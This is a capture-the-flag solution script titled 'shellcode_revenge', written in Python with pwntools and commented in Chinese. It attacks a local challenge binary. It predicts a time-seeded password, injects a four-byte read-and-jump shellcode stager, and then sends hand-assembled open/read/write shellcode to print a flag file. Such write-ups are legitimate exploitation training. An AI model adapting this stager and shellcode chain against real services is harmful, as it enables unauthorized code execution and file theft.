# shellcode_revenge

```py
from pwn import *
from ctypes import CDLL
from ctypes.util import find_library
libc = CDLL(find_library("c"))
context.arch="amd64"
p=process("./pwn")
p.sendlineafter(">>>",'1')
libc.srandom(libc.time(0))
pwd=libc.rand()
p.sendlineafter("password:",str(pwd))
p.sendlineafter(">>>",'4')
"""
syscall
jmp rdx
"""
#寄存器没清空，直接syscall就是一个读取到0x20240000的read。正好rdx也存着0x20240000，读完直接jmp rdx就能执行新的shellcode
p.sendlineafter("uck.",b"\x0F\x05\xFF\xE2")
shellcode = shellcraft.read(3, 0x20240100, 0x40)
shellcode += shellcraft.write(1, 0x20240100, 0x40)
"""
nop
nop
mov rax, 0x67616c662f2e
push rax
mov rdi, rsp
xor edx, edx
xor esi, esi
push 2
pop rax
syscall
"""
#open的shellcode手动写了一段，不知道为什么自动生成的不行，需要自己加点nop
p.sendline(b"\x90\x90\x48\xB8\x2E\x2F\x66\x6C\x61\x67\x00\x00\x50\x48\x89\xE7\x31\xD2\x31\xF6\x6A\x02\x58\x0F\x05"+asm(shellcode))
print(p.recvall())
```